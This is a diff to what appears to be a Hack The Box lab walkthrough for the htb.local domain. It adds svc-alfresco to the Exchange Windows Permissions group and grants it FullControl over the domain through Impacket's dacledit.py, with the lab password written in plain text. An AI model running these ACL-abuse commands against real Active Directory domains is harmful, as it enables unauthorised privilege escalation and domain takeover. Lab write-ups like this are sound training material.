@@ -53,7 +53,9 @@
 
 `net rpc group addmem "EXCHANGE WINDOWS PERMISSIONS" 'svc-alfresco' -U "htb.local"/'svc-alfresco' -S dc01.htb.local`
 
-7. Then give svc-alfresco user DCSync rights using Impacket's dacledit.py script
+7. Then give svc-alfresco user FullControl rights using Impacket's dacledit.py script
 
-``
+`dacledit.py -action 'write' -rights 'FullControl' -principal 'svc-alfresco' -dc-ip dc01.htb.local -target-sid 'S-1-5-21-3072663084-364016917-1341370565' 'htb.local'/'svc-alfresco':'s3rvice'`
+
+8.
 
